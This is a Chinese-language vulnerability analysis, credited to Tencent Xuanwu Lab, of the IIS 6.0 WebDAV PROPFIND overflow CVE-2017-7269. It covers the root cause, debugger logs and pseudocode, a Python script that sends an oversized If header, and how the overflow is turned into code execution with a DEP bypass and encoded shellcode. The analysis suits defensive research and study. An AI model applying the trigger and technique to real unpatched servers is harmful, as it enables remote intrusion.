来源：[玄武实验室](http://xlab.tencent.com/cn/2017/04/18/nsa-iis-vulnerability-analysis/)  
作者: **Ke Liu of Tencent’s Xuanwu Lab**

## 1\. 漏洞简介

### 1.1 漏洞简介

2017年3月27日，来自华南理工大学的 Zhiniang Peng 和 Chen Wu 在 GitHub
[[1](https://github.com/edwardz246003/IIS_exploit)] 上公开了一份 IIS 6.0
的漏洞利用代码，并指明其可能于 2016 年 7 月份或 8 月份被用于黑客攻击活动。

该漏洞的编号为 CVE-2017-7269 [[2](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7269)]，由恶意的 `PROPFIND` 请求所引起：当 `If` 字段包含形如
`<http://localhost/xxxx>` 的超长URL时，可导致缓冲区溢出（包括栈溢出和堆溢出）。

微软从 2015 年 7 月 14 日开始停止对 Windows Server 2003 的支持，所以这个漏洞也没有官方补丁，0patch
[[3](https://0patch.blogspot.com/2017/03/0patching-immortal-cve-2017-7269.html)] 提供了一个临时的解决方案。

无独有偶，Shadow Brokers 在2017年4月14日公布了一批新的 NSA 黑客工具，笔者分析后确认其中的 **Explodingcan** 便是
CVE-2017-7269 的漏洞利用程序，而且两个 Exploit 的写法如出一辙，有理由认为两者出自同一团队之手：

  * 两个 Exploit 的结构基本一致；
  * 都将 Payload 数据填充到地址 `0x680312c0`；
  * 都基于 `KiFastSystemCall / NtProtectVirtualMemory` 绕过 DEP；

本文以 3 月份公布的 Exploit 为基础，详细分析该漏洞的基本原理和利用技巧。

### 1.2 原理概述

  * `CStackBuffer` 既可以将栈设置为存储区（少量数据）、也可以将堆设置为存储区（大量数据）；
  * 为 `CStackBuffer` 分配存储空间时，误将 **字符数** 当做 **字节数** 使用，此为漏洞的根本原因；
  * 因为栈上存在 `cookie`，不能直接覆盖返回地址；
  * 触发溢出时，改写 `CStackBuffer` 对象的内存，使之使用地址 `0x680312c0` 作为存储区；
  * 将 Payload 数据填充到 `0x680312c0`；
  * 程序存在另一处类似的漏洞，同理溢出后覆盖了栈上的一个指针使之指向 `0x680313c0`；
  * `0x680313c0` 将被当做一个对象的起始地址，调用虚函数时将接管控制权；
  * 基于 `SharedUserData` 调用 `KiFastSystemCall` 绕过 DEP；
  * URL 会从 UTF-8 转为 UNICODE 形式；
  * Shellcode 使用 Alphanumeric 形式编码（UNICODE）；

# 2\. 漏洞原理

### 2.1 环境配置

在 Windows Server 2003 R2 Standard Edition SP2 上安装 IIS 并为其启用 **WebDAV** 特性即可。
![为IIS启用WebDAV特性](https://images.seebug.org/content/images/2017/04/iis-enable-webdav-1.jpg-w331s)

修改 Exploit 的目标地址，执行后可以看到 `svchost.exe` 启动 `w3wp.exe` 子进程，后者以 `NETWORK SERVICE`
的身份启动了 `calc.exe` 进程 。 ![CVE-2017-7269
IIS远程代码执行漏洞exploit](https://images.seebug.org/content/images/2017/04/iis-exploit.jpg-w331s)

### 2.2 初步调试

首先，为进程 `w3wp.exe` 启用 **PageHeap** 选项；其次，修改 Exploit 的代码，去掉其中的
Shellcode，使之仅发送超长字符串。

    
    
    import socket
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(('192.168.75.134',80))
    pay='PROPFIND / HTTP/1.1\r\nHost: localhost\r\nContent-Length: 0\r\n'
    pay+='If: <http://localhost/aaaaaaa'
    pay+='A'*10240
    pay+='>\r\n\r\n'
    sock.send(pay)

执行之后 IIS 服务器上会启动 `w3wp.exe` 进程（并不会崩溃），此时将 WinDbg 附加到该进程并再次执行测试代码，即可在调试器中捕获到
**first chance** 异常，可以得到以下信息：

  * 在 `httpext!ScStoragePathFromUrl+0x360` 处复制内存时产生了堆溢出；
  * 溢出的内容和大小看起来是可控的；
  * 被溢出的堆块在 `httpext!HrCheckIfHeader+0x0000013c` 处分配；
  * 崩溃所在位置也是从函数 `httpext!HrCheckIfHeader` 执行过来的；
  * 进程带有异常处理，因此不会崩溃；

    
    
    $$ 捕获 First Chance 异常
    0:020> g
    (e74.e80): Access violation - code c0000005 (first chance)
    First chance exceptions are reported before any exception handling.
    This exception may be expected and handled.
    eax=00005014 ebx=00002809 ecx=00000a06 edx=0781e7e0 esi=0781a7e4 edi=07821000
    eip=67126fdb esp=03fef330 ebp=03fef798 iopl=0         nv up ei pl nz na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
    httpext!ScStoragePathFromUrl+0x360:
    67126fdb f3a5            rep movs dword ptr es:[edi],dword ptr [esi]
    
    0:006> r ecx
    ecx=00000a06
    
    0:006> db esi
    0781a7e4  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
    0781a7f4  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
    0781a804  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
    0781a814  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
    0781a824  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
    0781a834  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
    0781a844  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
    0781a854  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
    
    $$ 目标堆块分配调用栈
    0:006> !heap -p -a edi
        address 07821000 found in
        _DPH_HEAP_ROOT @ 7021000
        in busy allocation (  DPH_HEAP_BLOCK:  UserAddr  UserSize - VirtAddr  VirtSize)
                                     7023680:   781e7d8      2828 -  781e000      4000
        7c83d97a ntdll!RtlAllocateHeap+0x00000e9f
        5b7e1a40 staxmem!MpHeapAlloc+0x000000f3
        5b7e1308 staxmem!ExchMHeapAlloc+0x00000015
        67125df9 httpext!CHeap::Alloc+0x00000017
        67125ee1 httpext!ExAlloc+0x00000008
        67125462 httpext!HrCheckIfHeader+0x0000013c
        6712561e httpext!HrCheckStateHeaders+0x00000010
        6711f659 httpext!CPropFindRequest::Execute+0x000000f0
        6711f7c5 httpext!DAVPropFind+0x00000047
        $$ ......
    
    $$ 调用栈
    0:006> k
    ChildEBP RetAddr  
    03fef798 67119469 httpext!ScStoragePathFromUrl+0x360
    03fef7ac 67125484 httpext!CMethUtil::ScStoragePathFromUrl+0x18
    03fefc34 6712561e httpext!HrCheckIfHeader+0x15e
    03fefc44 6711f659 httpext!HrCheckStateHeaders+0x10
    03fefc78 6711f7c5 httpext!CPropFindRequest::Execute+0xf0
    03fefc90 671296f2 httpext!DAVPropFind+0x47
    $$ ......
    
    $$ 异常可以被处理，因此不会崩溃
    0:006> g
    (e74.e80): C++ EH exception - code e06d7363 (first chance)

### 2.3 CStackBuffer

崩溃所在模块 `httpext.dll` 会多次使用一个名为 `CStackBuffer`
的模板，笔者写了一份类似的代码，以辅助对漏洞原理的理解。为了简单起见，默认存储类型为 `unsigned char`，因此省略了模板参数 `typename
T`。

`CStackBuffer` 的相关特性如下：

  * 默认使用栈作为存储空间，大小由模板参数 `SIZE` 决定；
  * 通过 `resize` 可以将堆设置为存储空间；
  * 通过 `fake_heap_size` 的最低位标识存储空间的类型；
  * 通过 `release` 释放存储空间；
  * 对象的内存布局依次为：栈存储空间、堆块大小成员、存储空间指针；

`CStackBuffer` 的源码如下：

    
    
    template<unsigned int SIZE>
    class CStackBuffer
    {
    public:
        CStackBuffer(unsigned int size)
        {
            fake_heap_size = 0;
            heap_buffer = NULL;
            resize(size);
        }
    
        unsigned char* resize(unsigned int size)
        {
            if (size <= SIZE)
            {
                size = SIZE;
            }
    
            if (fake_heap_size >> 2 < size)
            {
                if (fake_heap_size & 1 || size > SIZE)
                {
                    release();
                    heap_buffer = (unsigned char*)malloc(size);
                    fake_heap_size |= 1;
                }
                else
                {
                    heap_buffer = buffer;
                }
                fake_heap_size = (4 * size) | (fake_heap_size & 3);
            }
            fake_heap_size |= 2;
            return heap_buffer;
        }
    
        void release()
        {
            if (fake_heap_size & 1)
            {
                free(heap_buffer);
                heap_buffer = NULL;
            }
        }
    
        unsigned char* get()
        {
            return heap_buffer;
        }
    
        unsigned int getFakeSize()
        {
            return fake_heap_size;
        }
    
    private:
        unsigned char buffer[SIZE];
        unsigned int fake_heap_size;
        unsigned char* heap_buffer;
    };

### 2.4 漏洞调试

根据之前的简单分析，可知 `HrCheckIfHeader` 是一个关键函数，因为：

  * 目标堆块是在这个函数中动态分配的；
  * 从这里可以执行到触发异常的函数 `ScStoragePathFromUrl`；

函数 `HrCheckIfHeader` 简化后的伪代码如下所示：

    
    
    int HrCheckIfHeader(CMethUtil *pMethUtil)
    {
        CStackBuffer<260> buffer1;
        LPWSTR lpIfHeader = CRequest::LpwszGetHeader("If", 1);
        IFILTER ifilter(lpIfHeader);
        LPWSTR lpToken = ifilter->PszNextToken(0);
    
        while (1)
        {
            // <http://xxxxx>
            if (lpToken)
            {
                CStackBuffer<260> buffer2;
                // http://xxxx>
                LPWSTR lpHttpUrl = lpToken + 1;
                size_t length = wcslen(lpHttpUrl);
                if (!buffer2.resize(2*length + 2))
                {
                    buffer2.release();
                    return 0x8007000E;
                }
    
                // 将 URL 规范化后存入 buffer2
                // length = wcslen(lpHttpUrl) + 1
                // eax = 0
                int res = ScCanonicalizePrefixedURL(
                    lpHttpUrl, buffer2.get(), &length);
                if (!res)
                {
                    length = buffer1.getFakeSize() >> 3;
                    res = pMethUtil->ScStoragePathFromUrl(
                        buffer2.get(), buffer1.get(), &length);
                    if (res == 1)
                    {
                        if (buffer1.resize(length))
                        {
                            res = pMethUtil->ScStoragePathFromUrl(
                                buffer2.get(), buffer1.get(), &length);
                        }
                    }
                }
            }
            // ......
        }
        // ......
    }

可以看出这里的关键函数为 `CMethUtil::ScStoragePathFromUrl`，该函数会将请求转发给
`ScStoragePathFromUrl`，后者简化后的伪代码如下所示：

    
    
    typedef struct _HSE_UNICODE_URL_MAPEX_INFO {
        WCHAR lpszPath[MAX_PATH];
        DWORD dwFlags;        // The physical path that the virtual root maps to
        DWORD cchMatchingPath;// Number of characters in the physical path
        DWORD cchMatchingURL; // Number of characters in the URL
        DWORD dwReserved1;
        DWORD dwReserved2;
    } HSE_UNICODE_URL_MAPEX_INFO, * LPHSE_UNICODE_URL_MAPEX_INFO;
    
    int ScStoragePathFromUrl(
        const struct IEcb *iecb, 
        const wchar_t *buffer2, 
        wchar_t *buffer1, 
        unsigned int *length, 
        struct CVRoot **a5)
    {
        wchar_t *Str = buffer2;
        // 检查是否为 https://locahost:80/path http://localhost/path
        // 返回 /path>
        int result = iecb->ScStripAndCheckHttpPrefix(&Str);
        if (result < 0 || *Str != '/') return 0x80150101;
        int v7 = wcslen(Str);
    
        // c:\inetpub\wwwroot\path
        // dwFlags          = 0x0201
        // cchMatchingPath  = 0x12
        // cchMatchingURL   = 0x00
        // result = 0
        HSE_UNICODE_URL_MAPEX_INFO mapinfo;
        result = iecb->ScReqMapUrlToPathEx(Str, &mapinfo);
        int v36 = result;
        if (result < 0) return result;
    
        // L"\x00c:\inetpub\wwwroot"
        // n == 0
        wchar_t *Str1 = NULL;
        int n = iecb->CchGetVirtualRootW(&Str1);
        if (n == mapinfo.cchMatchingURL)
        {
            if (!n || Str[n-1] && !_wcsnicmp(Str1, Str, n))
            {
                goto LABEL_14;
            }
        }
        else if (n + 1 == mapinfo.cchMatchingURL)
        {
            if (Str[n] == '/' || Str[n] == 0)
            {
                --mapinfo.cchMatchingURL;
                goto LABEL_14;
            }
        }
        v36 = 0x1507F7;
    LABEL_14:
        if (v36 == 0x1507F7 && a5)      // a5 == 0
        {
            // ......
        }
    
        // 0x12
        int v16 = mapinfo.cchMatchingPath;
        if (mapinfo.cchMatchingPath)
        {
            // v17 = L"t\aaaaaaaAAA...."
            wchar_t *v17 = ((char*)&mapinfo - 2) + 2*v16;
            if (*v17 == '\\')
            {
                // ......
            }
            else if (!*v17)
            {
                // ......
            }
        }
    
        // v7 = wcslen(/path>)
        int v18 = v16 - mapinfo.cchMatchingURL + v7 + 1;
        int v19 = *length < v18;
        if (v19)
        {
            *length = v18;
            if (a5) 
            {
                // ......
            }
            result = 1;
        }
        else 
        {
            int v24 = (2*mapinfo.cchMatchingPath >> 2);
            qmemcpy(
                buffer1, 
                mapinfo.lpszPath, 
                4 * v24);
            LOBYTE(v24) = 2*mapinfo.cchMatchingPath;
            qmemcpy(
                &buffer1[2 * v24],
                (char*)mapinfo.lpszPath + 4 * v24,
                v24 & 3);
            qmemcpy(
                &buffer1[mapinfo.cchMatchingPath],
                &Str[mapinfo.cchMatchingURL],
                2 * (v7 - mapinfo.cchMatchingURL) + 2);
            for (wchar_t *p = &buffer1[mapinfo.cchMatchingPath]; *p; p += 2)
            {
                if (*p == '/') *p = '\\';
            }
            *length = mapinfo.cchMatchingPath - mapinfo.cchMatchingURL + v7 + 1;
            result = v36;
        }
    
        return result;
    }

函数 `HrCheckIfHeader` 会调用 `ScStoragePathFromUrl` 两次，在第一次调用
`ScStoragePathFromUrl` 时，会执行如下的关键代码：

    
    
    {
        wchar_t *Str = buffer2;
        // 返回 /path>
        int result = iecb->ScStripAndCheckHttpPrefix(&Str);
        int v7 = wcslen(Str);
    
        HSE_UNICODE_URL_MAPEX_INFO mapinfo;
        result = iecb->ScReqMapUrlToPathEx(Str, &mapinfo);
    
        // 0x12   L"c:\inetpub\wwwroot"
        int v16 = mapinfo.cchMatchingPath;
    
        //  v18 = 0x12 - 0 + wcslen('/path>') + 1 = 0x12 + 10249 + 1 = 0x281c
        int v18 = v16 - mapinfo.cchMatchingURL + v7 + 1;
        int v19 = *length < v18;
        if (v19)
        {
            *length = v18;
            if (a5) 
            {
                // ......
            }
            result = 1;
        }
    
        return result;
    }

这里得到 `v18` 的值为 `0x281c`，而 `*length` 的值由参数传递，实际由 `CStackBuffer::resize`
计算得到，最终的值为 `0x82`，计算公式为：

    
    
    fake_heap_size = 0;
    size = 260;
    fake_heap_size = (4 * size) | (fake_heap_size & 3);
    fake_heap_size |= 2;
    
    length = fake_heap_size >> 3;

显然有 `0x82 < 0x281c`，所以函数 `ScStoragePathFromUrl` 将 `*length` 填充为 `0x281c` 并返回
`1`。实际上，这个值代表的是真实物理路径的 **字符个数** 。

    
    
    0x281c = 0x12 ("c:\inetpub\wwwroot") + 10248 ("/aaa..") + 1 ('>') + 1 ('\0')

在 `HrCheckIfHeader` 第二次调用 `ScStoragePathFromUrl` 之前，将根据 `length` 的值设置
`CStackBuffer` 缓冲区的大小。然而，这里设置的大小是字符个数，并不是字节数，所以第二次调用 `ScStoragePathFromUrl`
时会导致缓冲区溢出。实际上，调用 `CStackBuffer::resize` 的位置就是
`httpext!HrCheckIfHeader+0x0000013c`，也就是堆溢出发生时通过 `!heap -p -a edi` 命令得到的栈帧。

    
    
    res = pMethUtil->ScStoragePathFromUrl(
        buffer2.get(), buffer1.get(), &length);
    if (res == 1)
    {
        if (buffer1.resize(length))    // httpext!HrCheckIfHeader+0x0000013c
        {
            res = pMethUtil->ScStoragePathFromUrl(
                buffer2.get(), buffer1.get(), &length);
        }
    }

小结：

  * 函数 `ScStoragePathFromUrl` 负责将 URL 请求中的文件路径转换为实际的物理路径，函数的名字也印证了这一猜想；
  * 第一次调用此函数时，由于缓冲区大小不够，返回实际物理路径的字符个数；
  * 第二次调用此函数之前先调整缓冲区的大小；
  * 由于缓冲区的大小设置成了字符个数，而不是字节数，因此导致缓冲区溢出；
  * 两次调用同一个 API 很符合微软的风格（第一次得到所需的空间大小，调整缓冲区大小后再次调用）；

## 3\. 漏洞利用

### 3.1 URL 解码

在函数 `HrCheckIfHeader` 中，首先调用 `CRequest::LpwszGetHeader` 来获取 **HTTP**
头中的特定字段的值，该函数简化后的伪代码如下所示：

    
    
    int CRequest::LpwszGetHeader(const char *tag, int a3)
    {
        // 查找缓存
        int res = CHeaderCache<unsigned short>::LpszGetHeader(
            (char *)this + 56, tag);
        if (res) return res;
    
        // 获取值
        char *pszHeader = this->LpszGetHeader(tag);
        if (!pszHeader) return 0;
    
        int nHeaderChars = strlen(pszHeader);
        CStackBuffer<tagPROPVARIANT, 64> stackbuffer(64);
        if (!stackbuffer.resize(2 * nHeaderChars + 2))
        {
            // _CxxThrowException(...);
        }
    
        // 调用 ScConvertToWide 进行转换
        int v11 = nHeaderChars + 1;
        char* language = this->LpszGetHeader("Accept-Language");
        int v7 = ScConvertToWide(pszHeader, &v11, 
                                 stackbuffer.get(), language, a3);
        if ( v7 ) // _CxxThrowException(...);
    
        // 设置缓存
        res = CHeaderCache<unsigned short>::SetHeader(
                tag, stackbuffer.get(), 0);
        stackbuffer.release();
    
        return res;
    }

可以看出这里通过 `CHeaderCache` 建立缓存机制，此外获取到的值会通过调用 `ScConvertToWide`
来进行转换操作。事实上，`ScConvertToWide` 会调用 `MultiByteToWideChar` 对字符串进行转换。

    
    
    MultiByteToWideChar(
        CP_UTF8, 
        0, 
        pszHeader, 
        strlen(pszHeader) + 1, 
        lpWideCharStr, 
        strlen(pszHeader) + 1);

由于存在编码转换操作，Exploit 中的 Payload 需要先进行编码，这样才能保证解码后得到正常的 Payload。字符串转换的调试日志如下所示：

    
    
    0:007> p
    eax=00000000 ebx=00000655 ecx=077f59a9 edx=077f5900 esi=0000fde9 edi=77e62fd6
    eip=6712721f esp=03fef5b0 ebp=03fef71c iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    httpext!ScConvertToWide+0x150:
    6712721f ffd7            call    edi {kernel32!MultiByteToWideChar (77e62fd6)}
    
    $$ 调用 MultiByteToWideChar 时的参数
    0:007> dds esp L6
    03fef5b0  0000fde9       $$ CP_UTF8
    03fef5b4  00000000       $$ 0
    03fef5b8  077f59a8       $$ pszHeader
    03fef5bc  00000655       $$ strlen(pszHeader) + 1
    03fef5c0  077f3350       $$ lpWideCharStr
    03fef5c4  00000655       $$ strlen(pszHeader) + 1
    
    $$ 转换前的字符串
    0:007> db 077f59a8
    077f59a8  3c 68 74 74 70 3a 2f 2f-6c 6f 63 61 6c 68 6f 73  <http://localhos
    077f59b8  74 2f 61 61 61 61 61 61-61 e6 bd a8 e7 a1 a3 e7  t/aaaaaaa.......
    077f59c8  9d a1 e7 84 b3 e6 a4 b6-e4 9d b2 e7 a8 b9 e4 ad  ................
    077f59d8  b7 e4 bd b0 e7 95 93 e7-a9 8f e4 a1 a8 e5 99 a3  ................
    077f59e8  e6 b5 94 e6 a1 85 e3 a5-93 e5 81 ac e5 95 a7 e6  ................
    077f59f8  9d a3 e3 8d a4 e4 98 b0-e7 a1 85 e6 a5 92 e5 90  ................
    077f5a08  b1 e4 b1 98 e6 a9 91 e7-89 81 e4 88 b1 e7 80 b5  ................
    077f5a18  e5 a1 90 e3 99 a4 e6 b1-87 e3 94 b9 e5 91 aa e5  ................
    
    0:007> p
    eax=000003d1 ebx=00000655 ecx=0000b643 edx=00000000 esi=0000fde9 edi=77e62fd6
    eip=67127221 esp=03fef5c8 ebp=03fef71c iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    httpext!ScConvertToWide+0x152:
    67127221 85c0            test    eax,eax
    
    $$ 转换后的字符串
    0:007> db 077f3350
    077f3350  3c 00 68 00 74 00 74 00-70 00 3a 00 2f 00 2f 00  <.h.t.t.p.:././.
    077f3360  6c 00 6f 00 63 00 61 00-6c 00 68 00 6f 00 73 00  l.o.c.a.l.h.o.s.
    077f3370  74 00 2f 00 61 00 61 00-61 00 61 00 61 00 61 00  t./.a.a.a.a.a.a.
    077f3380  61 00 68 6f 63 78 61 77-33 71 36 69 72 47 39 7a  a.hocxaw3q6irG9z
    077f3390  77 4b 70 4f 53 75 4f 7a-68 48 63 56 54 6d 45 68  wKpOSuOzhHcVTmEh
    077f33a0  53 39 6c 50 67 55 63 67-64 33 30 46 45 78 52 69  S9lPgUcgd30FExRi
    077f33b0  31 54 58 4c 51 6a 41 72-31 42 35 70 50 58 64 36  1TXLQjAr1B5pPXd6
    077f33c0  47 6c 39 35 6a 54 34 50-43 54 52 77 61 50 32 32  Gl95jT4PCTRwaP22

### 3.2 栈溢出

根据前面的分析，可以知道当字符串超长时是可以导致堆溢出的，但问题是堆块的基地址并不是固定的。实际上，当 `CStackBuffer`
使用栈作为存储空间时，也可以触发栈溢出，原理和堆溢出是一样的。

当然，这里不是通过栈溢出来执行代码，因为栈上有 `cookie`。

    
    
    .text:671255F5                 mov     large fs:0, ecx
    .text:671255FC                 mov     ecx, [ebp+var_10]
    .text:671255FF                 pop     ebx
    .text:67125600                 call    @__security_check_cookie@4
    .text:67125605                 leave
    .text:67125606                 retn    8
    .text:67125606 ?HrCheckIfHeader@@YGJPAVCMethUtil@@PBG@Z endp

在函数 `HrCheckIfHeader` 中存在两个 `CStackBuffer` 实例：

    
    
      char c_stack_buffer_1;            // [sp+44h] [bp-430h]@1
      unsigned int v29;                 // [sp+148h] [bp-32Ch]@9
      wchar_t *stack_buffer1;           // [sp+14Ch] [bp-328h]@9
      char c_stack_buffer_2;            // [sp+150h] [bp-324h]@7
      unsigned __int16 *stack_buffer2;  // [sp+258h] [bp-21Ch]@8

基于前面对 `CStackBuffer` 内存布局的分析，可以知道这里栈空间的分布为：

    
    
    ┌─────────────────────────┐
    │            2.heap_buffer│  ebp-21C
    ├─────────────────────────┤
    │         2.fake_heap_size│  ebp-220
    ├─────────────────────────┤
    │CStackBuffer2.buffer[260]│  ebp-324
    ├─────────────────────────┤
    │            1.heap_buffer│  ebp-328
    ├─────────────────────────┤
    │         1.fake_heap_size│  ebp-32C
    ├─────────────────────────┤
    │CStackBuffer1.buffer[260]│  ebp-430
    └─────────────────────────┘

下面要重点分析的代码片段为：

    
    
    res = pMethUtil->ScStoragePathFromUrl(
        buffer2.get(), buffer1.get(), &length);     // (1)
    if (res == 1)
    {
        if (buffer1.resize(length))                 // (2)
        {
            res = pMethUtil->ScStoragePathFromUrl(  // (3)
                buffer2.get(), buffer1.get(), &length);
        }
    }

**(1)** `HrCheckIfHeader` 第一次调用 `ScStoragePathFromUrl` 时传递的参数分析如下（函数返回值为
`1`，长度设置为 `0xaa`）：

    
    
    0:006> dds esp L3
    03faf7b4  077d8eb0      $$ http://localhost/aaaaaaa....
    03faf7b8  03faf804      $$ CStackBuffer1.buffer
    03faf7bc  03faf800      $$ 00000082
    
    0:006> dd 03faf800 L1
    03faf800  
    
    0:006> db 077d8eb0
    077d8eb0  68 00 74 00 74 00 70 00-3a 00 2f 00 2f 00 6c 00  h.t.t.p.:././.l.
    077d8ec0  6f 00 63 00 61 00 6c 00-68 00 6f 00 73 00 74 00  o.c.a.l.h.o.s.t.
    077d8ed0  2f 00 61 00 61 00 61 00-61 00 61 00 61 00 61 00  /.a.a.a.a.a.a.a.
    077d8ee0  68 6f 63 78 61 77 33 71-36 69 72 47 39 7a 77 4b  hocxaw3q6irG9zwK
    077d8ef0  70 4f 53 75 4f 7a 68 48-63 56 54 6d 45 68 53 39  pOSuOzhHcVTmEhS9
    077d8f00  6c 50 67 55 63 67 64 33-30 46 45 78 52 69 31 54  lPgUcgd30FExRi1T
    077d8f10  58 4c 51 6a 41 72 31 42-35 70 50 58 64 36 47 6c  XLQjAr1B5pPXd6Gl
    077d8f20  39 35 6a 54 34 50 43 54-52 77 61 50 32 32 4b 6d  95jT4PCTRwaP22Km
    077d8f30  34 6c 47 32 41 62 4d 37-61 51 62 58 73 47 50 52  4lG2AbM7aQbXsGPR
    077d8f40  70 36 44 75 6a 68 74 33-4a 4e 6b 78 76 49 73 4e  p6Dujht3JNkxvIsN
    077d8f50  6a 4c 7a 57 71 6f 4a 58-30 32 6e 37 49 4b 4d 52  jLzWqoJX02n7IKMR
    077d8f60  63 48 4c 6f 56 75 75 75-6f 66 68 76 4d 44 70 50  cHLoVuuuofhvMDpP
    077d8f70  36 7a 4b 62 57 65 50 75-72 6a 6b 7a 62 77 58 76  6zKbWePurjkzbwXv
    077d8f80  48 62 31 65 54 30 79 6c-4a 50 62 54 33 50 77 35  Hb1eT0ylJPbT3Pw5
    077d8f90  77 6a 44 41 34 33 76 64-46 4d 54 56 6c 47 43 65  wjDA43vdFMTVlGCe
    077d8fa0  32 76 78 72 69 57 38 43-72 62 30 5a 38 59 48 54  2vxriW8Crb0Z8YHT
    077d8fb0  02 02 02 02 c0 12 03 68-44 6c 56 52 37 4b 6d 6c  .......hDlVR7Kml
    077d8fc0  58 4f 5a 58 50 79 6a 49-4f 58 52 4a 50 41 4d 66  XOZXPyjIOXRJPAMf
    077d8fd0  c0 13 03 68 34 48 31 65-43 6f 66 6e 41 74 6c 43  ...h4H1eCofnAtlC
    077d8fe0  c0 13 03 68 43 53 41 6a-52 70 30 33 66 58 4c 42  ...hCSAjRp03fXLB
    077d8ff0  4b 70 46 63 73 51 41 79-50 7a 6c 4a 3e 00 00 00  KpFcsQAyPzlJ>...
    077d9000  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????

**(2)** 因为 `ScStoragePathFromUrl` 返回 `0xaa`，所以 `buffer1.resize(0xaa)`
并不会在堆上分配空间，而是直接使用栈上的 `buffer`。

**(3)** 第二次调用 `ScStoragePathFromUrl` 时会导致栈溢出，实际结果是
`CStackBuffer1.fake_heap_size` 被改写为 `0x02020202`、`CStackBuffer1.heap_buffer`
被改写为 `0x680312c0`。

    
    
    0:006> dds esp L3
    03faf7b4  077d8eb0      $$ http://localhost/aaaaaaa....
    03faf7b8  03faf804      $$ CStackBuffer1.buffer
    03faf7bc  03faf800      $$ 00000412 = ((0x104 * 4) | (0x82 & 3)) | 2
    
    $$ 留意最后面 2 个 DWORD 的值
    0:006> db ebp-430 L10C
    03faf804  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    03faf814  c0 59 55 03 00 00 00 00-00 10 08 00 60 f8 fa 03  .YU.........`...
    03faf824  fc f7 fa 03 f8 64 02 07-94 f8 fa 03 70 82 82 7c  .....d......p..|
    03faf834  a0 6e 87 7c 00 00 00 00-9c 6e 87 7c 00 00 00 00  .n.|.....n.|....
    03faf844  01 00 00 00 16 00 00 00-23 9f 87 7c 00 00 00 00  ........#..|....
    03faf854  c4 af 7b 04 02 00 00 01-00 00 00 00 04 5d 88 8a  ..{..........]..
    03faf864  6c 00 00 00 8c 1e 8f 60-82 1e 8f 60 02 00 00 00  l......`...`....
    03faf874  9a 1e 8f 60 34 fb fa 03-33 00 00 00 00 00 00 00  ...`4...3.......
    03faf884  8c 1e 8f 60 52 23 8f 60-22 00 00 00 00 00 00 00  ...`R#.`".......
    03faf894  00 00 00 00 00 00 00 00-01 00 00 00 0c 00 00 00  ................
    03faf8a4  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    03faf8b4  f6 67 ca 77 00 00 00 00-00 00 00 00 00 00 00 00  .g.w............
    03faf8c4  00 00 00 00 00 00 00 00-20 f9 fa 03 4a b0 bc 77  ........ ...J..w
    03faf8d4  85 05 00 00 4f f9 fa 03-5b 20 11 67 5c b0 bc 77  ....O...[ .g\..w
    03faf8e4  5b 20 11 67 b0 72 bd 77-4f f9 fa 03 5b 20 11 67  [ .g.r.wO...[ .g
    03faf8f4  13 00 00 00 58 00 00 00-00 00 00 00 e8 64 02 07  ....X........d..
    03faf904  c0 17 bf 77 12 04 00 00-04 f8 fa 03              ...w........
                          ^^^^^^^^^^^ ~~~~~~~~~~~
    
    0:006> p
    eax=00000000 ebx=070fbfc0 ecx=0000e694 edx=03faf804 esi=00000001 edi=77bd8ef2
    eip=67125484 esp=03faf7c0 ebp=03fafc34 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    httpext!HrCheckIfHeader+0x15e:
    67125484 8bf0            mov     esi,eax
    
    $$ 留意最后面 2 个 DWORD 的值
    0:006> db ebp-430 L10C
    03faf804  63 00 3a 00 5c 00 69 00-6e 00 65 00 74 00 70 00  c.:.\.i.n.e.t.p.
    03faf814  75 00 62 00 5c 00 77 00-77 00 77 00 72 00 6f 00  u.b.\.w.w.w.r.o.
    03faf824  6f 00 74 00 5c 00 61 00-61 00 61 00 61 00 61 00  o.t.\.a.a.a.a.a.
    03faf834  61 00 61 00 68 6f 63 78-61 77 33 71 36 69 72 47  a.a.hocxaw3q6irG
    03faf844  39 7a 77 4b 70 4f 53 75-4f 7a 68 48 63 56 54 6d  9zwKpOSuOzhHcVTm
    03faf854  45 68 53 39 6c 50 67 55-63 67 64 33 30 46 45 78  EhS9lPgUcgd30FEx
    03faf864  52 69 31 54 58 4c 51 6a-41 72 31 42 35 70 50 58  Ri1TXLQjAr1B5pPX
    03faf874  64 36 47 6c 39 35 6a 54-34 50 43 54 52 77 61 50  d6Gl95jT4PCTRwaP
    03faf884  32 32 4b 6d 34 6c 47 32-41 62 4d 37 61 51 62 58  22Km4lG2AbM7aQbX
    03faf894  73 47 50 52 70 36 44 75-6a 68 74 33 4a 4e 6b 78  sGPRp6Dujht3JNkx
    03faf8a4  76 49 73 4e 6a 4c 7a 57-71 6f 4a 58 30 32 6e 37  vIsNjLzWqoJX02n7
    03faf8b4  49 4b 4d 52 63 48 4c 6f-56 75 75 75 6f 66 68 76  IKMRcHLoVuuuofhv
    03faf8c4  4d 44 70 50 36 7a 4b 62-57 65 50 75 72 6a 6b 7a  MDpP6zKbWePurjkz
    03faf8d4  62 77 58 76 48 62 31 65-54 30 79 6c 4a 50 62 54  bwXvHb1eT0ylJPbT
